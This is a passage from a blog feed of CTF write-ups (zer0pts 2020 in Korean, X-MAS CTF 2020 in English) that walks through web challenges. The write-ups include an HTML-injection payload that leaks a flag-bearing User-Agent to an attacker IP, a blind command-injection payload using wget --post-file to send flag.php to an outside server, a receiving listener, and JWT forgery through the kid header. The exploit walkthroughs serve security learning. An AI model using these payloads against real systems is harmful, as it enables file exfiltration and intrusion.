<code>User-Agent</code>의 값으로 <code>FLAG</code>를 넣고, id 값이 like인 버튼을 클릭해서 <code>좋아요</code>를 눌러주는 것을 볼 수 있습니다.</p><p><span style="color:#631F9C">&#62;</span> init.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">header(<span class="string">&quot;Content-Security-Policy: default-src &#x27;self&#x27;; object-src &#x27;none&#x27;; script-src &#x27;nonce-$&#123;nonce&#125;&#x27; &#x27;strict-dynamic&#x27;; base-uri &#x27;none&#x27;; trusted-types&quot;</span>);</span><br><span class="line">header(<span class="string">&#x27;X-Frame-Options: DENY&#x27;</span>);</span><br><span class="line">header(<span class="string">&#x27;X-XSS-Protection: 1; mode=block&#x27;</span>);</span><br></pre></td></tr></table></figure><p>그래서 XSS를 이용해서 User-Agent 값을 가져와야 하나 생각을 했지만 위와 같이 CSP가 걸려 있어 불가능해보였습니다,, 하지만 아까 util.php의 render_tags() 함수에서 strip_tags() 함수를 사용해서 태그를 검증하고 있었는데 이때 함수를 우회해서 a 태그를 사용할 수 있었습니다.</p><p>그럼 content의 값으로 “&#60;a id=’like’ href=’myip’&#62;&#60;/a&#62;”를 주면 click(‘#like’)에 의해서 User-Agent에 FLAG가 들어있는 상태로 myip로 요청이 갈 것 입니다.</p><p><span style="color:#631F9C">&#62;</span> Exploit</p><p><img src="https://github.com/wjddnjs33/image/blob/main/Zer0pts%20CTF%202020/MusicBlog/4.png?raw=true"></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a/udio id=&quot;like&quot; href=&quot;http://141.164.52.207:12345&quot;&gt;GG<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>그래서 위 페이로드를 <code>Content</code>의 값으로 넘겨주니 요청이 내 서버로 전송이 된 것을 확인할 수 있었고, User-Agent 헤더의 flag가 있는 것도 볼 수 있었습니다.</p><blockquote><p>FLAG : zer0pts{M4sh1m4fr3sh!!}</p></blockquote><hr><h3 id="Web-phpNantoKaAdmin-755pts"><a href="#Web-phpNantoKaAdmin-755pts" class="headerlink" title="(Web) phpNantoKaAdmin [755pts]"></a>(Web) phpNantoKaAdmin [755pts]</h3><p>귀찮다.</p><hr>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SSRF </tag>
            
            <tag> Python Pickle RCE </tag>
            
            <tag> REDIS </tag>
            
            <tag> Client Attack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>X-MAS CTF 2020 Write Up</title>
      <link href="2020/12/19/2020-12-19-X-MAS-CTF-2020/"/>
      <url>2020/12/19/2020-12-19-X-MAS-CTF-2020/</url>
      
        <content type="html"><![CDATA[<p>This is the first X-MAS CTF to start studying web security and it was much more fun than I thought. Let’s write a Write Up of interesting problems while solving problems in this CTF.</p><p>This time, I participated in CTF by collaborating with <span style="color:blue"><code>Einstrasse</code></span>. If you want to see eine’s Write Up, you can go <a href="https://eine.tistory.com/entry/Xmas-CTF-2020-write-ups-focus-on-web-challs?category=826774">here</a>!</p><p><img src="https://github.com/wjddnjs33/image/blob/main/X-MAS-CTF-2020/main.png?raw=true"></p><hr><h2 id="Programming-Least-Greatest-50-pts"><a href="#Programming-Least-Greatest-50-pts" class="headerlink" title=" (Programming) Least Greatest [50 pts]"></a><span style="color:#21C587"></span> (Programming) Least Greatest [50 pts]</h2><p><img src="https://github.com/wjddnjs33/image/blob/main/X-MAS-CTF-2020/Least%20Greatest/1.png?raw=true"><br>This time, we will solve the programming problems from X-MAS CTF 2020. The problem was solved easily because <code>eine</code> analyzed the algorithm.<br><img src="https://github.com/wjddnjs33/image/blob/main/X-MAS-CTF-2020/Least%20Greatest/2.png?raw=true"><br>If you connect with nc, you can see that gcd, lcm numbers are given. Here, the number of factors obtained by decomposing the lcm/gcd value by 2^N is given to the next step.</p><p>It is said that you can do this a total of 100 times, but the time should be within 90 seconds. So I just used Python to write the code and return it.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> subprocess <span class="keyword">import</span> check_output</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;challs.xmas.htsp.ro&quot;</span>, <span class="number">6050</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;1/100\n&quot;</span>).strip().split()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">go</span>(<span class="params">_count</span>):</span></span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(_count):</span><br><span class="line">        num = r.recvline().decode(<span class="string">&#x27;utf-8&#x27;</span>).split(<span class="string">&quot;= &quot;</span>)[<span class="number">1</span>]</span><br><span class="line">        num1 = r.recvline().decode(<span class="string">&#x27;utf-8&#x27;</span>).split(<span class="string">&quot;= &quot;</span>)[<span class="number">1</span>]</span><br><span class="line">        print(<span class="string">&quot;gcd(x, y) : &quot;</span> + num)</span><br><span class="line">        print(<span class="string">&quot;lcm(x, y) : &quot;</span> + num1)</span><br><span class="line">        s_num = <span class="built_in">int</span>(<span class="built_in">int</span>(num1)//<span class="built_in">int</span>(num))</span><br><span class="line">        cmd = <span class="string">&quot;yafu-x64 factor(&#123;&#125;)&quot;</span>.<span class="built_in">format</span>(s_num)</span><br><span class="line">        out = subprocess.check_output(cmd, shell=<span class="literal">True</span>)</span><br><span class="line">        check = out.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        length = check.count(<span class="string">&#x27;P&#x27;</span>)</span><br><span class="line">        data = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, length + <span class="number">1</span>):</span><br><span class="line">            data.append(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        j = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, length+<span class="number">1</span>):</span><br><span class="line">            data[j] = check.split(<span class="string">&#x27;P&#x27;</span>)[i].split(<span class="string">&quot; =&quot;</span>)[<span class="number">1</span>].replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;ans&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            j += <span class="number">1</span></span><br><span class="line">        b = []</span><br><span class="line">        k = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data)):</span><br><span class="line">            <span class="keyword">if</span> i == <span class="number">0</span>:</span><br><span class="line">                b.append(data[i])</span><br><span class="line">            <span class="keyword">if</span> i != <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>+k,<span class="built_in">len</span>(b)):</span><br><span class="line">                    <span class="keyword">if</span> b[j] != data[i]:</span><br><span class="line">                        b.append(data[i])</span><br><span class="line">                        k += <span class="number">1</span>           </span><br><span class="line">        Count = <span class="built_in">len</span>(b)</span><br><span class="line">        count = <span class="number">2</span>**Count</span><br><span class="line">        print(<span class="string">&quot;Round : &#123;&#125;&quot;</span>.<span class="built_in">format</span>(a+<span class="number">1</span>))</span><br><span class="line">        r.sendline(<span class="built_in">str</span>(count))</span><br><span class="line">        print(r.recvline())</span><br><span class="line">        r.recvline()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    go(<span class="number">100</span>)</span><br><span class="line">    print(r.recv())</span><br></pre></td></tr></table></figure><p>I wrote the exploit code as above.<br><img src="https://github.com/wjddnjs33/image/blob/main/X-MAS-CTF-2020/Least%20Greatest/3.png?raw=true"><br>When I returned the exploit code, I could see the flag appear.</p><blockquote><p>FLAG : X-MAS{gr347es7_c0mm0n_d1v1s0r_4nd_l345t_c0mmon_mult1pl3_4r3_1n73rc0nn3ct3d}</p></blockquote><hr><h2 id="Web-PHP-Master-33-pts"><a href="#Web-PHP-Master-33-pts" class="headerlink" title=" (Web) PHP Master [33 pts]"></a><span style="color:#21C587"></span> (Web) PHP Master [33 pts]</h2><p><img src="https://github.com/wjddnjs33/image/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202020-12-18%20%EC%98%A4%EC%A0%84%206.25.00.png?raw=true"></p><p>Solve URL : <code>http://challs.xmas.htsp.ro:3000/?param1=1.0&amp;param2=001</code><br></p><blockquote><p>FLAG : X-MAS{s0_php_m4ny_skillz-69acb43810ed4c42}</p></blockquote><hr><h2 id="Web-flag-checker-59-pts"><a href="#Web-flag-checker-59-pts" class="headerlink" title=" (Web) flag_checker [59 pts]"></a><span style="color:#21C587"></span> (Web) flag_checker [59 pts]</h2><p><img src="https://github.com/wjddnjs33/image/blob/main/X-MAS-CTF-2020/flag_checker/1.png?raw=truehttps://github.com/wjddnjs33/image/blob/main/X-MAS-CTF-2020/flag_checker/1.png?raw=true"><br>This time, we will solve a problem called <code>flag_checker</code> among web problems in X-MAS CTF 2020.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/* flag_checker */</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>])) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkFlag</span>(<span class="params"><span class="variable">$flag</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$example_flag</span> = strtolower(<span class="string">&#x27;FAKE-X-MAS&#123;d1s_i\$_a_SaMpL3_Fl4g_n0t_Th3_c0Rr3c7_one_karen_l1k3s_HuMu5.0123456789&#125;&#x27;</span>);</span><br><span class="line">    <span class="variable">$valid</span> = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; strlen(<span class="variable">$flag</span>) &amp;&amp; <span class="variable">$valid</span>; <span class="variable">$i</span>++)</span><br><span class="line">        <span class="keyword">if</span>(strpos(<span class="variable">$example_flag</span>, strtolower(<span class="variable">$flag</span>[<span class="variable">$i</span>])) === <span class="literal">false</span>) <span class="variable">$valid</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$valid</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"><span class="variable">$flag</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$command</span> = <span class="string">&quot;wget -q -O - https://kuhi.to/flag/&quot;</span> . <span class="variable">$flag</span>;</span><br><span class="line">    <span class="variable">$cmd_output</span> = <span class="keyword">array</span>();</span><br><span class="line">    exec(<span class="variable">$command</span>, <span class="variable">$cmd_output</span>);</span><br><span class="line">    <span class="keyword">if</span>(count(<span class="variable">$cmd_output</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Nope&#x27;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Maybe&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$flag</span>  = <span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!checkFlag(<span class="variable">$flag</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;That is not a correct flag!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">getFlag(<span class="variable">$flag</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>When it comes to problems, the above PHP source code exists.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkFlag</span>(<span class="params"><span class="variable">$flag</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$example_flag</span> = strtolower(<span class="string">&#x27;FAKE-X-MAS&#123;d1s_i\$_a_SaMpL3_Fl4g_n0t_Th3_c0Rr3c7_one_karen_l1k3s_HuMu5.0123456789&#125;&#x27;</span>);</span><br><span class="line">    <span class="variable">$valid</span> = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; strlen(<span class="variable">$flag</span>) &amp;&amp; <span class="variable">$valid</span>; <span class="variable">$i</span>++)</span><br><span class="line">        <span class="keyword">if</span>(strpos(<span class="variable">$example_flag</span>, strtolower(<span class="variable">$flag</span>[<span class="variable">$i</span>])) === <span class="literal">false</span>) <span class="variable">$valid</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$valid</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Looking at the checkFlag function, it puts a fake flag in a variable called example_flag, and checks whether the character in $flag is in example_flag.</p><p>If any of the values of $flag are not included in example_flag, False is returned.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"><span class="variable">$flag</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$command</span> = <span class="string">&quot;wget -q -O - https://kuhi.to/flag/&quot;</span> . <span class="variable">$flag</span>;</span><br><span class="line">    <span class="variable">$cmd_output</span> = <span class="keyword">array</span>();</span><br><span class="line">    exec(<span class="variable">$command</span>, <span class="variable">$cmd_output</span>);</span><br><span class="line">    <span class="keyword">if</span>(count(<span class="variable">$cmd_output</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Nope&#x27;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Maybe&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>The getFlag function receives the $flag value, connects it after the wget command, and sets the output of the exec function as an array.</p><p>Here, if the command executed well, it prints Maybe, and if not, prints Nope.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$flag</span>  = <span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!checkFlag(<span class="variable">$flag</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;That is not a correct flag!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">getFlag(<span class="variable">$flag</span>);</span><br></pre></td></tr></table></figure><p>In the above part, you can see that the flag value is received, the input value is verified using the checkFlag function, and the getFlag function is executed if the filtering does not occur.</p><p>In this problem, the command execution value is not output, so the input value must be retrieved to a private server.</p><p>So, first, let’s check if there is a way to get the php file using the wget command.<br><img src="https://github.com/wjddnjs33/image/blob/main/X-MAS-CTF-2020/flag_checker/2.png?raw=true"><br>When I searched Google for Blind Command Injection, I could see that using the –post-file option of the wget command as above, the file was read and sent as the POST body value.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> PORT = <span class="number">80</span>;</span><br><span class="line"><span class="keyword">const</span> app = express();</span><br><span class="line"></span><br><span class="line">app.use(bodyParser.urlencoded(&#123;</span><br><span class="line">  extended: <span class="literal">true</span></span><br><span class="line">&#125;));</span><br><span class="line"></span><br><span class="line">app.post(<span class="string">&#x27;/&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>)</span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;X-MAS!!!!&quot;</span>);</span><br><span class="line"><span class="built_in">console</span>.log(req.body);</span><br><span class="line">res.send();</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.listen(PORT, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;--------------------------------&#x27;</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;Listening on port &#x27;</span> + PORT + <span class="string">&#x27;...&#x27;</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;--------------------------------&#x27;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>In order to receive the flag, I built a simple server using Node.js to output the POST body value as above.</p><p><code>Payload : $&#123;IFS&#125;-$&#123;IFS&#125;--post-file$&#123;IFS&#125;flag.php$&#123;IFS&#125;141.164.55.161</code></p><p>So, I passed the payload above as the flag value.<br><img src="https://github.com/wjddnjs33/image/blob/main/X-MAS-CTF-2020/flag_checker/3.png?raw=true"><br>When I checked the server log, I could see the flag.php file came.</p><blockquote><p>FLAG : X-MAS{s0_fL4g_M4ny_IFS_bb69cd55f5f6}</p></blockquote><hr><h2 id="Web-X-MAS-Chan-470-pts"><a href="#Web-X-MAS-Chan-470-pts" class="headerlink" title=" (Web) X-MAS Chan [470 pts]"></a><span style="color:#21C587"></span> (Web) X-MAS Chan [470 pts]</h2><p><img src="https://github.com/wjddnjs33/image/blob/main/X-MAS-CTF-2020/X-MAS%20Chan/1.png?raw=true"><br>This time, we will solve the problem called <code>X-MAS Chan</code> among web problems from X-MAS CTF 2020.<br><img src="https://github.com/wjddnjs33/image/blob/main/X-MAS-CTF-2020/X-MAS%20Chan/2.png?raw=true"><br>If you come into trouble, you can see there are links and rules that can get you into the board.<br><img src="https://github.com/wjddnjs33/image/blob/main/X-MAS-CTF-2020/X-MAS%20Chan/3.png?raw=true"><br>When I came to the board, I can see that the file upload function exists as above. </p><p>And as a result of checking, it was found that only photos such as jpg, png, and gif can be uploaded.<br><img src="https://github.com/wjddnjs33/image/blob/main/X-MAS-CTF-2020/X-MAS%20Chan/4.png?raw=true"><br>Also, if you check the source code, you can see that there is getbanner.php, and the logic is logic to get a picture using jwt. <code>You can see that jwt is set as a value in a cookie called banner.</code><br><img src="https://github.com/wjddnjs33/image/blob/main/X-MAS-CTF-2020/X-MAS%20Chan/5.png?raw=true"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;typ&quot;: &quot;JWT&quot;,</span><br><span class="line">  &quot;alg&quot;: &quot;HS256&quot;,</span><br><span class="line">  &quot;kid&quot;: &quot;&#x2F;tmp&#x2F;jwt.key&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>When the jwt is decoded, you can see that the header part uses the <code>HS256</code> algorithm as above and the kid value is using <code>/tmp/jwt.key</code>.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;banner&quot;: &quot;banner&#x2F;11.gif&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>As the data above, you can see that you are receiving a 11.gif photo as the value of the banner. So, if you give <code>flag.php</code> as the <code>value of banner</code>, it will read and return <code>flag.php</code>, not the picture. </p><p>So how do I <code>sign</code> JWT when I don’t know the <code>secret key</code>? </p><p>You can think of the kid value in the header as a pointer to the secret key. In the above jwt, since kid points to <code>/tmp/jwt.key</code>, the value contained in jwt.key can be used as the secret key. </p><p>So, upload a photo using the file upload function, and when the kid points to the photo, you can sign using the binary value of the photo.<br><img src="https://github.com/wjddnjs33/image/blob/main/X-MAS-CTF-2020/X-MAS%20Chan/6.png?raw=true"><br>I will make a gif file as above and use it.<br><img src="https://github.com/wjddnjs33/image/blob/main/X-MAS-CTF-2020/X-MAS%20Chan/7.png?raw=true"><br>So, when I uploaded the file, you can see the file was created with the path <code>/b/src/1608071199792.gif</code>. Now, if you give the above path as the <code>kid</code> value in the jwt header, you can use the <code>binary value of the above file</code> as the <code>secret key.</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;jwt.gif&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">    key = fp.read()</span><br><span class="line"></span><br><span class="line">print(jwt.encode(&#123;<span class="string">&#x27;banner&#x27;</span>: <span class="string">&#x27;flag.php&#x27;</span>&#125;, key, algorithm=<span class="string">&#x27;HS256&#x27;</span>, headers=&#123;<span class="string">&#x27;kid&#x27;</span>: <span class="string">&#x27;/var/www/html/b/src/1608071199792.gif&#x27;</span>&#125;))</span><br></pre></td></tr></table></figure><p>I wrote jwt Signing code as above.<br><img src="https://github.com/wjddnjs33/image/blob/main/X-MAS-CTF-2020/X-MAS%20Chan/8.png?raw=true"><br>If you run the code, you can see jwt appear as above.<br><img src="https://github.com/wjddnjs33/image/blob/main/X-MAS-CTF-2020/X-MAS%20Chan/9.png?raw=true"><br>When I decode jwt and check it, I can see that the value is well entered.<br><img src="https://github.com/wjddnjs33/image/blob/main/X-MAS-CTF-2020/X-MAS%20Chan/10.png?raw=true"><br>So when I send a request to getbanner.php using the above jwt, you can see that flag.php is displayed, not the picture.</p><blockquote><p>FLAG : X-MAS{n3v3r_trust_y0ur_us3rs_k1ds-b72dcf5a49498400}</p></blockquote><hr><h2 id="Web-cat-clicker-474-pts"><a href="#Web-cat-clicker-474-pts" class="headerlink" title=" (Web) cat_clicker [474 pts]"></a><span style="color:#21C587"></span> (Web) cat_clicker [474 pts]</h2><p><img src="https://github.com/wjddnjs33/image/blob/main/X-MAS-CTF-2020/Cat%20Clicker!/1.png?raw=true"><br>This time, we will solve the problem called <code>Cat Clicker</code> among web problems from X-MAS CTF 2020.<br><img src="https://github.com/wjddnjs33/image/blob/main/X-MAS-CTF-2020/Cat%20Clicker!/2.png?raw=true"><br>When it comes to problems, there is logic to buy flags using the number of cats. The fake flag seems to be available for purchase if you have one cat and the real flag is 13 cats.<br><img src="https://github.com/wjddnjs33/image/blob/main/X-MAS-CTF-2020/Cat%20Clicker!/3.png?raw=true"><br>You can increase the number of cats by clicking on the face, but it seems like 12 is the maximum.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">state : 12 | 0</span><br><span class="line">hash : cf13ab76afb625f7f7d6c539c2cb3c84</span><br><span class="line"></span><br><span class="line">state : 12 | 1</span><br><span class="line">hash : e71f77e8f7c2c2957292f4a0e1d79d9d</span><br><span class="line"></span><br><span class="line">(Skip)</span><br><span class="line"></span><br><span class="line">state : 12 | 12</span><br><span class="line">hash : 9579729592f72a075bb61f63b8ea238e</span><br></pre></td></tr></table></figure><p>As above, the number of cats is managed by the hash value, and looking at the hash, it seems to be an md5 hash.<br><img src="https://github.com/wjddnjs33/image/blob/main/X-MAS-CTF-2020/Cat%20Clicker!/4.png?raw=true"><br>And since this web service has a .git directory, you can pull out all the .git trees.<br><img src="https://github.com/wjddnjs33/image/blob/main/X-MAS-CTF-2020/Cat%20Clicker!/5.png?raw=true"><br>I downloaded all the .git trees using gitdumper.sh, and you can lick the source code using the <code>git cat-file -p</code> command.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hashFor</span>(<span class="params"><span class="variable">$state</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$secret</span> = getenv(<span class="string">&quot;SECRET_THINGY&quot;</span>); <span class="comment">// 64 random characters - impossible to guess</span></span><br><span class="line"><span class="variable">$s</span> = <span class="string">&quot;<span class="subst">$secret</span> | <span class="subst">$state</span>&quot;</span>;</span><br><span class="line"><span class="keyword">return</span> md5(<span class="variable">$s</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">verifyState</span>(<span class="params"><span class="variable">$state</span>, <span class="variable">$hash</span></span>) </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$hash</span> === hashFor(<span class="variable">$state</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getCatsNo</span>(<span class="params"><span class="variable">$state</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$arr</span> = explode(<span class="string">&quot; | &quot;</span>, <span class="variable">$state</span>);</span><br><span class="line"><span class="keyword">return</span> intval(end(<span class="variable">$arr</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getParentsLimit</span>(<span 